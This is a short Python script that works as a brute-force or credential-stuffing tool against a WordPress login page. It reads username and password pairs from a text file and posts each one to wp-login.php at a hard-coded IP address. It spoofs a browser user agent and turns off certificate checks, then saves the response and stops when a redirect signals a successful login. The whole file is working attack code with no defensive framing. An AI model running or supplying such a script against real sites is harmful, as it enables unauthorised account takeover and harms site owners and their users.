import requests
import webbrowser

combine_file = open("test_result.txt", 'r', encoding="utf-8")
with open("test_result.txt", mode="r", encoding='utf-8') as file_1:
    for line in file_1:
        log, pwd = line.split(' ')
        login_data = dict()

        login_data = {
            'log':log,
            'pwd':pwd.strip(),
        }
        print(login_data)
        with requests.Session() as s:
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
            headers = {'User_Agent': user_agent}
            url = "http://3.16.240.57/wp-login.php"
            r = s.post(url, data = login_data, headers=headers, verify=False)
            with(open('f1.html', "wb+")) as f:
                if r.url != url:
                    f.write(r.content)
                    print('success')
                    break
            # s.close()
        
    file_1.close()

